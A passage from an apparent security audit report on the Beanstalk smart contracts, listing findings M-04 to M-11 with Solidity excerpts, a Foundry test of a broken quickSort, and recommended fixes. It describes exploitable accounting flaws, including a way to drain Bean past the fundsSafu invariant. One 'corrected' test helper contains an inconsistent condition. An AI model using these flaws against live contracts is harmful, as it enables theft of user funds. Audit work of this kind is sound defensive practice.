        uint256 depositId = LibBytes.packAddressAndStem(token, stem);

        // add a depositId to an account's depositList, if there is not an existing deposit.
-        if (s.accts[account].deposits[depositId].amount == 0) {
+        if (s.accts[account].deposits[depositId].amount == 0 && amount > 0) {
            s.accts[account].depositIdList[token].push(depositId);
        }
        ...
    }
```

## <a id='M-04'></a>M-04.  LibUsdOracle is completely broken for the to-deploy L2 chain

_Submitted by [holydevoti0n](https://profiles.cyfrin.io/u/undefined), [T1MOH](https://profiles.cyfrin.io/u/undefined), [Bauchibred](https://profiles.cyfrin.io/u/undefined), [bladesec](https://profiles.cyfrin.io/u/undefined), [Bube](https://profiles.cyfrin.io/u/undefined), [golanger85](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Bauchibred](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/libraries/Oracle/LibUsdOracle.sol#L36-L37


## Summary

The `LibUsdOracle` library would be completely non-functional and incompatible with the intended L2 deployment of the Beanstalk protocol due to its reliance on a hardcoded Chainlink registry address that only functions on the Ethereum mainnet.

## Vulnerability Details

The finale of the Beanstalk contests on Codehawks, also hinted how the protocol is to be deployed on an L2, there is no specific one at the moment but it should be an EVM compatible L2.

Issue however is that whichever L2 the protocol gets deployed on, be it an optimistic one or not, the `LibUsdOracle` is going to be broken, this is because the chainlink registry is being initialised as a constant: https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/libraries/Oracle/LibUsdOracle.sol#L36-L37

```solidity
    address constant chainlinkRegistry = 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf;

```

Now would be key to note that from the official Chainlink docs on their feed registries: https://docs.chain.link/data-feeds/feed-registry#contract-addresses, we can see that the `0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf` address is only active on the etheruem mainnnet
![](https://cdn.discordapp.com/attachments/1235966308542185483/1253169159492079717/Screenshot_2024-06-20_at_05.06.43.png?ex=6674e03a&is=66738eba&hm=f8a7eb8f5e96f828ed5f576e674c680dbecc26d5b661cf840d3235228e9297ac&)

This would then mean that all the instances where the `chainlinkRegistry` is being queried in the `LibUsdOracle` would be broken, note that from the contract we can see that whatever token's price we are trying to get there is always a need to query the `getTokenPriceFromExternal`, i.e here is the instance on getting `(Usd:token Price)` https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/libraries/Oracle/LibUsdOracle.sol#L61-L64

```solidity
        // 1e18 * 1e6 = 1e24.
        uint256 tokenPrice = getTokenPriceFromExternal(token, lookback);
        if (tokenPrice == 0) return 0;
        return uint256(1e24).div(tokenPrice);
```

_There is also an instance on getting `(token:Usd Price)` here https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/libraries/Oracle/LibUsdOracle.sol#L91_

Now, the implementation of `getTokenPriceFromExternal()` directly attempts to get the feed from the registry: https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/libraries/Oracle/LibUsdOracle.sol#L113-L118

```solidity
                // use the chainlink registry
                chainlinkOraclePriceAddress = ChainlinkPriceFeedRegistry(chainlinkRegistry).getFeed(
                        token,
                        0x0000000000000000000000000000000000000348
                    ); // 0x0348 is the address for USD
            }
```

And even https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/libraries/Oracle/LibUsdOracle.sol#L147-L152

```solidity
            if (chainlinkOraclePriceAddress == address(0)) {
                // use the chainlink registry
                chainlinkOraclePriceAddress = ChainlinkPriceFeedRegistry(chainlinkRegistry).getFeed(
                        chainlinkToken,
                        0x0000000000000000000000000000000000000348
                    ); // 0x0348 is the address for USD
```

However all these attempts at querying the feed addresses would be broken.

## Impact

`LibUsdOracle` is incompatible with the L2 chain that protocol is going to get deployed on.

## Tools Used

- Manual review.
- Official Chainlink docs on their feed registries: https://docs.chain.link/data-feeds/feed-registry#contract-addresses.

## Recommendations

Consider scrapping the idea of attempting to query feeds from the feed registry on L2s.

## <a id='M-05'></a>M-05. quickSort function does not work as expected, compromising the calculation of Beans per Well to be minted during a flood

_Submitted by [holydevoti0n](https://profiles.cyfrin.io/u/undefined), [T1MOH](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [crunter](https://profiles.cyfrin.io/u/undefined). Selected submission by: [crunter](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Peg maintenance of the Bean price is achieved in several ways depending on the specific state of the protocol. During a flood, the bean price is above the peg value and there is an excessive low debt level. To address this, Beanstalk mints additional Beans. However, the calculation of the Beans to be minted can be compromised due to an incorrect implementation of the array sorting function.

## Vulnerability Details

During a flood, [`contracts/libraries/Silo/LibFlood.sol::quickSort`](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/4e0ad0b964f74a1b4880114f4dd5b339bc69cd3e/protocol/contracts/libraries/Silo/LibFlood.sol#L240) function is intended to sort in descending order a given Well deltaBs array `arr` to calculate the amount of Beans per Well that should be minted. This is a critical step as it directly impacts Bean issuance for the protocol in order to maintain the peg of the Bean price. However, on most cases the resulting array will not be sorted correctly because of a bug within the `quickSort` function.

Internally, the `quickSort` function attempts to improve performance on random data by choosing the median of `arr[left].deltaB`, `arr[right].deltaB` and `arr[middle].deltaB` as pivot.

```solidity
    uint mid = uint(left) + (uint(right) - uint(left)) / 2;
        WellDeltaB memory pivot = arr[uint(left)].deltaB > arr[uint(mid)].deltaB
            ? (
                arr[uint(left)].deltaB < arr[uint(right)].deltaB
                    ? arr[uint(left)]
                    : arr[uint(right)]              //<@ FINDING
            )
            : (arr[uint(mid)].deltaB < arr[uint(right)].deltaB ? arr[uint(mid)] : arr[uint(right)]); //<@ FINDING
```

Nevertheless, the scheme used to get the pivot does not take into account the following two cases:

* `(arr[left].deltaB > arr[mid].deltaB) && arr[left].deltaB > arr[right].deltaB && (arr[right].deltaB < arr[mid].deltaB)`
* `(arr[left].deltaB < arr[mid].deltaB) && arr[mid].deltaB > arr[right].deltaB && (arr[right].deltaB < arr[left].deltaB)`

This results in poor pivot selection.

In addition, on line [270](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/4e0ad0b964f74a1b4880114f4dd5b339bc69cd3e/protocol/contracts/libraries/Silo/LibFlood.sol#L270) the function uses recursion to sort the elements on the left side of the array.

```solidity
        if (left < j) {
            return quickSort(arr, left, j);    // <@ FINDING
        }
        if (i < right) {
            return quickSort(arr, i, right);
        }
        return arr;
```

However, because of the `return` statement used, the right side of the array never gets sorted, rendering the entire `quickSort` function useless.

## Proof of concept

The [`test/foundry/sun/Flood.t.sol::testQuickSort`](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/4e0ad0b964f74a1b4880114f4dd5b339bc69cd3e/protocol/test/foundry/sun/Flood.t.sol#L485) test provided in the protocol repository is sufficient to demonstrate the code error in the function by simply changing the input array and running it. For example, changing the sign of `wells[4]` value:

```diff
-        wells[4] = LibFlood.WellDeltaB(address(4), -500);
+        wells[4] = LibFlood.WellDeltaB(address(4), 500);
```

The following code is a very detailed test of the quickSort function in order to illustrate the problems encountered. This code works as a standalone foundry contract test as it does not depend on external files or additional information. Executing it with a verbosity level of two (`-vv`) is enough to see the logged explanation of the outputs.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

import {Test, console} from "forge-std/Test.sol";

struct WellDeltaB {
    address well;
    int256 deltaB;
}

contract quickSortTest is Test {
    WellDeltaB[] public arr0; // random data array
    WellDeltaB[] public expectedOutputArray; // expected sorted output array
    WellDeltaB public expectedPivot;

    QuickSort sortArray;

    function setUp() public {
        sortArray = new QuickSort();

        // initialize arr0 with random data
        // arr0 deltaB values = [39, 6, 27, -14, 15];

        arr0.push(WellDeltaB(address(1), int256(39)));
        arr0.push(WellDeltaB(address(2), int256(6)));
        arr0.push(WellDeltaB(address(3), int256(27)));
        arr0.push(WellDeltaB(address(4), int256(-14)));
        arr0.push(WellDeltaB(address(5), int256(15)));

        //left deltaB : arr0.deltaB[0] = 39
        //right deltaB: arr0.deltaB[4] = 15
        //mid deltaB: arr0.deltaB[2] = 27
        //For this specific set of random data, the expected pivot for the first iteration is the middle value: 27

        expectedPivot.well = address(3);
        expectedPivot.deltaB = 27;

        // expected ordered array deltaB values  = [39, 27, 15, 6, -14]
        expectedOutputArray.push(WellDeltaB(address(1), int256(39)));
        expectedOutputArray.push(WellDeltaB(address(3), int256(27)));
        expectedOutputArray.push(WellDeltaB(address(5), int256(15)));
        expectedOutputArray.push(WellDeltaB(address(2), int256(6)));
        expectedOutputArray.push(WellDeltaB(address(4), int256(-14)));
    }

    function testPivotCalculation() public view {
        WellDeltaB memory pivot1;
        WellDeltaB memory pivot2;

        // this calculates the pivot only for the first iteration of the recursive
        // quickSort function, in order to illustrate the mistake in the original function
        pivot1 = sortArray.pivotOriginal(arr0, 0, int256(arr0.length - 1));
        pivot2 = sortArray.pivot2(arr0, 0, int256(arr0.length - 1));

        console.log("Expected pivot (1st iteration): %i", expectedPivot.deltaB);
        console.log("Original pivot (1st iteration): %i", pivot1.deltaB);
        console.log("Corrected pivot (1st iteration): %i", pivot2.deltaB);

        assert(pivot1.deltaB != expectedPivot.deltaB); // The original calculation for the pivot is incorrect
        assert(pivot2.deltaB == expectedPivot.deltaB);
    }

    function testQuickSortFunction() public view {
        WellDeltaB[] memory arr1;
        WellDeltaB[] memory arr2;

        arr1 = sortArray.quickSort(arr0, 0, int256(arr0.length - 1));
        arr2 = sortArray.quickSort2(arr0, 0, int256(arr0.length - 1));

        // print to console the original deltaBs array
        console.log("Original array deltaBs:");
        for (uint i; i < arr0.length; i++) {
            console.log("deltaB: %i", arr0[i].deltaB);
        }

        // print to console the sorted deltaBs array using the original quickSort function
        console.log("\nSorted array using the original quickSort function:");
        for (uint i; i < arr1.length; i++) {
            console.log("deltaB: %i", arr1[i].deltaB);
        }

        // print to console the sorted deltaBs array using the corrected quickSort function
        console.log("\nSorted array using the corrected quickSort function:");
        for (uint i; i < arr2.length; i++) {
            console.log("deltaB: %i", arr2[i].deltaB);
        }

        // compare the expected output with the original quickSort function output
        bool quickSortSuccess = sortArray.compareArrays(
            expectedOutputArray,
            arr1
        );

        // compare the expected output with the corrected quickSort function output
        bool quickSort2Success = sortArray.compareArrays(
            expectedOutputArray,
            arr2
        );

        assert(quickSortSuccess == false); // proves that the original quickSort function does not work properly
        assert(quickSort2Success == true); // proves the functionality of the quickSort2 function
    }
}

contract QuickSort {
    // ******** The original quickSort function ***********
    // made public for practical testing purposes
    function quickSort(
        WellDeltaB[] memory arr,
        int left,
        int right
    ) public pure returns (WellDeltaB[] memory) {
        if (left >= right) return arr;

        // Choose the median of left, right, and middle as pivot (improves performance on random data)
        uint mid = uint(left) + (uint(right) - uint(left)) / 2;
        WellDeltaB memory pivot = arr[uint(left)].deltaB > arr[uint(mid)].deltaB
            ? (
                arr[uint(left)].deltaB < arr[uint(right)].deltaB
                    ? arr[uint(left)]
                    : arr[uint(right)]
            )
            : (
                arr[uint(mid)].deltaB < arr[uint(right)].deltaB
                    ? arr[uint(mid)]
                    : arr[uint(right)]
            );

        int i = left;
        int j = right;
        while (i <= j) {
            while (arr[uint(i)].deltaB > pivot.deltaB) i++;
            while (pivot.deltaB > arr[uint(j)].deltaB) j--;
            if (i <= j) {
                (arr[uint(i)], arr[uint(j)]) = (arr[uint(j)], arr[uint(i)]);
                i++;
                j--;
            }
        }

        if (left < j) {
            return quickSort(arr, left, j);
        }
        if (i < right) {
            return quickSort(arr, i, right);
        }
        return arr;
    }

    // ******** The corrected quickSort function ***********
    // made public for practical testing purposes
    function quickSort2(
        WellDeltaB[] memory arr,
        int left,
        int right
    ) public pure returns (WellDeltaB[] memory) {
        if (left >= right) return arr;

        // Choose the median of left, right, and middle as pivot (improves performance on random data)
        uint mid = uint(left) + (uint(right) - uint(left)) / 2;
        WellDeltaB memory pivot;

        if (arr[uint(left)].deltaB > arr[uint(mid)].deltaB) {
            if (arr[uint(left)].deltaB < arr[uint(right)].deltaB) {
                pivot = arr[uint(left)];
            } else {
                if (arr[uint(right)].deltaB > arr[uint(mid)].deltaB) {
                    pivot = arr[uint(right)];
                } else {
                    pivot = arr[uint(mid)];
                }
            }
        } else {
            if (arr[uint(mid)].deltaB < arr[uint(right)].deltaB) {
                pivot = arr[uint(mid)];
            } else {
                if (arr[uint(right)].deltaB > arr[uint(left)].deltaB) {
                    pivot = arr[uint(right)];
                } else {
                    pivot = arr[uint(left)];
                }
            }
        }

        int i = left;
        int j = right;
        while (i <= j) {
            while (arr[uint(i)].deltaB > pivot.deltaB) i++;
            while (pivot.deltaB > arr[uint(j)].deltaB) j--;
            if (i <= j) {
                (arr[uint(i)], arr[uint(j)]) = (arr[uint(j)], arr[uint(i)]);
                i++;
                j--;
            }
        }

        if (left < j) {
            arr = quickSort2(arr, left, j);
        }
        if (i < right) {
            return quickSort2(arr, i, right);
        }
        return arr;
    }

    // ******** The original pivot calculation ***********
    function pivotOriginal(
        WellDeltaB[] memory arr,
        int left,
        int right
    ) public pure returns (WellDeltaB memory) {
        // Choose the median of left, right, and middle as pivot (improves performance on random data)
        uint mid = uint(left) + (uint(right) - uint(left)) / 2;
        WellDeltaB memory pivot = arr[uint(left)].deltaB > arr[uint(mid)].deltaB
            ? (
                arr[uint(left)].deltaB < arr[uint(right)].deltaB
                    ? arr[uint(left)]
                    : arr[uint(right)]
            )
            : (
                arr[uint(mid)].deltaB < arr[uint(right)].deltaB
                    ? arr[uint(mid)]
                    : arr[uint(right)]
            );

        return pivot;
    }

    // ******** The corrected pivot calculation ***********
    function pivot2(
        WellDeltaB[] memory arr,
        int left,
        int right
    ) public pure returns (WellDeltaB memory) {
        // Choose the median of left, right, and middle as pivot (improves performance on random data)
        uint mid = uint(left) + (uint(right) - uint(left)) / 2;
        WellDeltaB memory pivot;

        if (arr[uint(left)].deltaB > arr[uint(mid)].deltaB) {
            if (arr[uint(left)].deltaB < arr[uint(mid)].deltaB) {
                pivot = arr[uint(left)];
            } else {
                if (arr[uint(right)].deltaB > arr[uint(mid)].deltaB) {
                    pivot = arr[uint(right)];
                } else {
                    pivot = arr[uint(mid)];
                }
            }
        } else {
            if (arr[uint(mid)].deltaB < arr[uint(right)].deltaB) {
                pivot = arr[uint(mid)];
            } else {
                if (arr[uint(right)].deltaB > arr[uint(left)].deltaB) {
                    pivot = arr[uint(right)];
                } else {
                    pivot = arr[uint(left)];
                }
            }
        }

        return pivot;
    }

    function compareArrays(
        WellDeltaB[] memory arr1,
        WellDeltaB[] memory arr2
    ) public pure returns (bool) {
        if (arr1.length != arr2.length) {
            return false;
        }
        for (uint i = 0; i < arr1.length; i++) {
            if (
                arr1[i].well != arr2[i].well || arr1[i].deltaB != arr2[i].deltaB
            ) {
                return false;
            }
        }
        return true;
    }
}

```

## Impact

Impact: High

This bug directly affects the issuance of Beans in order to maintain the price peg. Its impact is directly proportional to the size of the `wellDeltaB` array.

Likelyhood: Medium

Only presented during a flood.

## Tools Used

Manual Review

Foundry

## Recommended Mitigation

Previously presented in the proof of concept, it is advisable to change the scheme to obtain the pivot.
To include all the possible cases, an `if-else` conditional statement scheme is recommended:

```Solidity
// Choose the median of left, right, and middle as pivot (improves performance on random data)
        uint mid = uint(left) + (uint(right) - uint(left)) / 2;
        WellDeltaB memory pivot;

        if (arr[uint(left)].deltaB > arr[uint(mid)].deltaB) {
            if (arr[uint(left)].deltaB < arr[uint(right)].deltaB) {
                pivot = arr[uint(left)];
            } else {
                if (arr[uint(right)].deltaB > arr[uint(mid)].deltaB) {
                    pivot = arr[uint(right)];
                } else {
                    pivot = arr[uint(mid)];
                }
            }
        } else {
            if (arr[uint(mid)].deltaB < arr[uint(right)].deltaB) {
                pivot = arr[uint(mid)];
            } else {
                if (arr[uint(right)].deltaB > arr[uint(left)].deltaB) {
                    pivot = arr[uint(right)];
                } else {
                    pivot = arr[uint(left)];
                }
            }
        }
```

It is critical to remove the `return` statement when sorting the left side of the array, to allow the right side to be processed as well.

```diff
        if (left < j) {
-           return quickSort(arr, left, j);
+           arr = quickSort(arr, left, j);
        }

        if (i < right) {
            return quickSort(arr, i, right);
        }
        return arr;
```

## <a id='M-06'></a>M-06. When migrating via `L2ContractMigrationFacet`, user is not minted roots for the newly accrued stalk

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined). Selected submission by: [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
Users lose roots upon migration

## Vulnerability Details
When migrating to L2, the user's roots are included in the merkle leaf. If before their migrations seasons have passed and the stemTip has increased, user will be minted extra stalk for it.

```solidity
            uint256 depositId = depositData.depositIds[i];
            (address depositToken, int96 stem) = depositId.unpackAddressAndStem();
            require(depositToken == depositData.token, "Migration: INVALID_DEPOSIT_ID");
            require(stemTip >= stem, "Migration: INVALID_STEM");

            // add deposit to account.
            s.accts[account].deposits[depositId].amount = depositData.amounts[i];
            s.accts[account].deposits[depositId].bdv = depositData.bdvs[i];

            // increment totalBdvForAccount by bdv of deposit:
            totalBdvForAccount += depositData.bdvs[i];

            // increment by grown stalk of deposit.
            accountStalk += uint96(stemTip - stem) * depositData.bdvs[i];
```

Usually, when stalk is minted, roots are also minted at the current silo ratios. However, this will not be the case here.

As users will be minted less roots, this will make the overall `roots : stalk` ratio higher, which will on its own allow for unfair minting of Beans via `plant` for all other users

## Impact
Loss of roots, unfair minting of Beans

## Tools Used
Manual review

## Recommendations
Mint extra roots depending on the newly minted stalk 
## <a id='M-07'></a>M-07. `LibSilo.transferStalk()` uses incorrect formula to roundUp

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

It calculates proportional amount of Roots to transfer when transfers Stalk to another account. It wants to roundUp the division, however it's done incorrectly:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/Silo/LibSilo.sol#L296-L298>

```solidity
    function transferStalk(address sender, address recipient, uint256 stalk) internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
        uint256 roots;
        roots = stalk == s.accts[sender].stalk
            ? s.accts[sender].roots
@>          : s.sys.silo.roots.sub(1).mul(stalk).div(s.sys.silo.stalk).add(1);

        ...
    }
```

Counter example is following: `5 * 500 / 3` is rounded down to 833. Well known formula to roundUp is to subtract 1 from numerator and add 1 to result, so in example it will be `(5 * 500 - 1) / 3 + 1 = 834`.

However current formula calculates `(5 - 1) * 500 / 3 + 1 = 666`, which is obviously wrong.

## Impact

Instead of rounding up actual formula in the contrary underestimates the result.

## Tools Used

Manual Review

## Recommendations

```diff
        roots = stalk == s.accts[sender].stalk
            ? s.accts[sender].roots
-           : s.sys.silo.roots.sub(1).mul(stalk).div(s.sys.silo.stalk).add(1);
+           : s.sys.silo.roots.mul(stalk).sub(1).div(s.sys.silo.stalk).add(1);
```

## <a id='M-08'></a>M-08. `L2ContractMigrationFacet.addMigratedDepositsToAccount()` forfeits "unmowed" rewards from other Silo deposits

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Silo deposits earn reward as time passes. Process of claiming accrued reward is called "mow": it updates current balances of Roots and Stalk associated with deposits of certain token.

L2ContractMigrationFacet is used to migrate Silo deposits owned by smart contracts. Unlike ReseedSilo, this migration is user-executed and will happen after the migration process. Problem is that such migration forfeits "unmowed" rewards of account because accumulator stem is updated to the most recent version.

## Vulnerability Details

Here you can see that during migration it calculates grown Stalk associated with migrated deposits and updates `lastStem` in the end:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L191>

```solidity
    function addMigratedDepositsToAccount(
        address account,
        AccountDepositData calldata depositData
    ) internal returns (uint256 accountStalk) {
        int96 stemTip = LibTokenSilo.stemTipForToken(depositData.token);
        ...
        for (uint256 i; i < depositData.depositIds.length; i++) {
            // verify that depositId is valid.
            uint256 depositId = depositData.depositIds[i];
            (address depositToken, int96 stem) = depositId.unpackAddressAndStem();
            ...

            // increment by grown stalk of deposit.
@>          accountStalk += uint96(stemTip - stem) * depositData.bdvs[i];

            ...
        }

        // update mowStatuses for account and token.
        s.accts[account].mowStatuses[depositData.token].bdv = totalBdvForAccount;
@>      s.accts[account].mowStatuses[depositData.token].lastStem = stemTip;

        ...
    }
```

`lastStem` is cumulated value used to determine the value of stem at which rewards were "mowed" last time. As you can see, if user has other depositIds besides migrated ones, he looses rewards for them.

## Impact

Users will lose "unmowed" rewards from other Silo deposits when they migrate via L2ContractMigrationFacet.

## Tools Used

Manual Review

## Recommendations

Mow in the beginning of migration:

```diff
    function addMigratedDepositsToAccount(
        address account,
        AccountDepositData calldata depositData
    ) internal returns (uint256 accountStalk) {
+       LibSilo._mow(account, depositData.token);
        int96 stemTip = LibTokenSilo.stemTipForToken(depositData.token);
        uint256 stalkIssuedPerBdv = s.sys.silo.assetSettings[depositData.token].stalkIssuedPerBdv;
        uint128 totalBdvForAccount;
        uint128 totalDeposited;
        uint128 totalDepositedBdv;
        for (uint256 i; i < depositData.depositIds.length; i++) {
            ...
        }

        // update mowStatuses for account and token.
        s.accts[account].mowStatuses[depositData.token].bdv = totalBdvForAccount;
-       s.accts[account].mowStatuses[depositData.token].lastStem = stemTip;

        ...
    }
```

## <a id='M-09'></a>M-09. `L2ContractMigrationFacet.addMigratedDepositsToAccount()` doesn't push depositId to `depositIdList`

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

`depositIdList` is array of Silo deposits owned by account. Ids are pushed on new deposits and deleted on withdrawals. `depositIdList` is used to track deposits of user off-chain.

Problem is that L2ContractMigrationFacet doesn't update this array when migrates deposits. You can check it here:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L168-L170>

Issue arises at the moment when such migrated deposit is removed from account (during transfer or withdrawal). It tries to remove such depositId from `depositIdList`, as a result full removal will revert:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L383-L387>

```solidity
    function removeDepositFromAccount(
        address account,
        address token,
        int96 stem,
        uint256 amount
    ) internal returns (uint256 crateBDV) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        uint256 depositId = LibBytes.packAddressAndStem(token, stem);

        uint256 crateAmount = s.accts[account].deposits[depositId].amount;
        crateBDV = s.accts[account].deposits[depositId].bdv;
        require(amount <= crateAmount, "Silo: Crate balance too low.");

        // Partial remove
        if (amount < crateAmount) {
            ...
        }
        // Full remove
        if (crateAmount > 0) {
            delete s.accts[account].deposits[depositId];
@>          removeDepositIDfromAccountList(account, token, depositId);
        }

        ...
    }
    
    function removeDepositIDfromAccountList(
        address account,
        address token,
        uint256 depositId
    ) internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
@>      uint256 i = findDepositIdForAccount(account, token, depositId);
        ...
    }

    function findDepositIdForAccount(
        address account,
        address token,
        uint256 depositId
    ) internal view returns (uint256 i) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        uint256[] memory depositIdList = s.accts[account].depositIdList[token];
        uint256 length = depositIdList.length;
        while (depositIdList[i] != depositId) {
            i++;
            if (i >= length) {
@>              revert("Id not found");
            }
        }
        return i;
    }
```

## Vulnerability Details

## Impact

Accounts which migrated via L2ContractMigrationFacet.sol can't perform full withdrawal in Silo. Worth noting is that L2ContractMigrationFacet manages migration of deposits owned by smart contracts.

So it is highly likely that smart contracts don't have functionality to perform partial withdraw to avoid issue. In case it lacks such functionality, its deposits can't be withdrawn and therefore frozen forever.

## Tools Used

Manual Review

## Recommendations

```diff
    function addMigratedDepositsToAccount(
        address account,
        AccountDepositData calldata depositData
    ) internal returns (uint256 accountStalk) {
        ...
        for (uint256 i; i < depositData.depositIds.length; i++) {
            ...

            // add deposit to account.
+           if (s.accts[account].deposits[depositId].amount == 0) {
+               s.accts[account].depositIdList[token].push(depositId);
+           }
            s.accts[account].deposits[depositId].amount = depositData.amounts[i];
            s.accts[account].deposits[depositId].bdv = depositData.bdvs[i];

            ...
        }

        ...
    }
```

## <a id='M-10'></a>M-10. ReseedField.sol incorrectly configures Field values because of mistake in storage layout

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Previously there was single Field, so variable `s.sys.field` in storage contained data about Pods. Now field data is stored in `mapping(uint256 => Field) fields`.

Problem is that variable `s.sys.field` is forgotten to delete. And this variable by mistake configured in ReseedField instead of actual mapping `s.sys.fields`.

## Vulnerability Details

Here you can see that `s.sys.field` is configured:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/init/reseed/L2/ReseedField.sol#L64-L66>

```solidity
    function init(
        MigratedPlotData[] calldata accountPlots,
        uint256 totalPods,
        uint256 harvestable,
        uint256 harvested,
        uint256 fieldId,
        uint8 initialTemperature
    ) external {
        ...

        s.sys.field.pods = totalPods;
        s.sys.field.harvestable = harvestable;
        s.sys.field.harvested = harvested;

        ...
    }
```

However protocol never uses `s.sys.field`. It uses `s.sys.fields[fieldId]` instead.

## Impact

Field module is completely broken because Field's main variables are not initialized after migration. At least users can't harvest their Pods because their plotIndex is much bigger than current harvestable index (because `s.sys.fields[fieldId].harvestable` counts again from 0):
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/field/FieldFacet.sol#L169-L186>

```solidity
    function _harvest(
        uint256 fieldId,
        uint256[] calldata plots
    ) internal returns (uint256 beansHarvested) {
        for (uint256 i; i < plots.length; ++i) {
            // The Plot is partially harvestable if its index is less than
            // the current harvestable index.
@>          require(plots[i] < s.sys.fields[fieldId].harvestable, "Field: Plot not Harvestable");
            uint256 harvested = _harvestPlot(LibTractor._user(), fieldId, plots[i]);
            beansHarvested += harvested;
        }
        s.sys.fields[fieldId].harvested += beansHarvested;
        emit Harvest(LibTractor._user(), fieldId, plots, beansHarvested);
    }
```

Additionally Invariable.sol uses uninitialized value to calculate minimum required balance:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/Invariable.sol#L189>

## Tools Used

Manual Review

## Recommendations

Configure `s.sys.fields` in ReseedField.sol and remove `s.sys.field` from storage.

## <a id='M-11'></a>M-11. Invariable.sol won't save Bean from exploit because of flawed entitlement calculation

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

`fundsSafu` modifier is used to ensure that Protocol has enough balances to cover all the obligations after functino execution.

Problem is that it doesn't include Bean amounts contributed while creating PodOrder in Market module. It introduces significant flaw to invariant logic:

1. Suppose Attacker found the way to drain Bean from protocol.
2. `fundsSafu` modifier should prevent such exploit
3. Attacker performs exploit and drains Bean. He can drain as much Bean as deposited to Market. Because Beans deposited to Market are not accounted in `fundsSafu`
4. Moreover user can submit his own Beans prior to exploit and perform Attack from different address. In this case he doesn't risk funds, however he expects compensation for deposited funds from DAO. In this case DAO can't distinguish real users' addresses and attacker's addresses and there is no easy way to compensate users of Market.

## Vulnerability Details

`getTokenEntitlementsAndBalances` doesn't account Beans deposited via Market:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/Invariable.sol#L182-L190>

```solidity
    function getTokenEntitlementsAndBalances(
        address[] memory tokens
    ) internal view returns (uint256[] memory entitlements, uint256[] memory balances) {
        ...

        for (uint256 i; i < tokens.length; i++) {
            ...
            if (tokens[i] == C.BEAN) {
                entitlements[i] +=
                    (s.sys.fert.fertilizedIndex -
                        s.sys.fert.fertilizedPaidIndex +
                        s.sys.fert.leftoverBeans) + // unrinsed rinsable beans
                    s.sys.silo.unripeSettings[C.UNRIPE_BEAN].balanceOfUnderlying; // unchopped underlying beans
                for (uint256 j; j < s.sys.fieldCount; j++) {
                    entitlements[i] += (s.sys.fields[j].harvestable - s.sys.fields[j].harvested); // unharvested harvestable beans
                }
            }
            ...
        }
        return (entitlements, balances);
    }
```

And Market transfer Beans to `address(this)` during PodOrder creation:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/market/MarketplaceFacet/MarketplaceFacet.sol#L70>

```solidity
    function createPodOrder(
        PodOrder calldata podOrder,
        uint256 beanAmount,
        LibTransfer.From mode
    ) external payable fundsSafu noSupplyChange noOutFlow returns (bytes32 id) {
        require(podOrder.orderer == LibTractor._user(), "Marketplace: Non-user create order.");
@>      beanAmount = LibTransfer.receiveToken(C.bean(), beanAmount, LibTractor._user(), mode);
        return _createPodOrder(podOrder, beanAmount);
    }
```

## Impact

Invariable.sol is included in scope to this audit, however severity classification for this contract should differ from standard one. This contract is circuit breaker which must halt execution when funds are drained so that Critical exploit can't occur.

I believe it's High severity issue if Invariable fails to prevent drain of funds because the way it calculates entitlements can be circumvented. This issue shows exactly how during Critical exploit attacker Invariable can be circumvented/

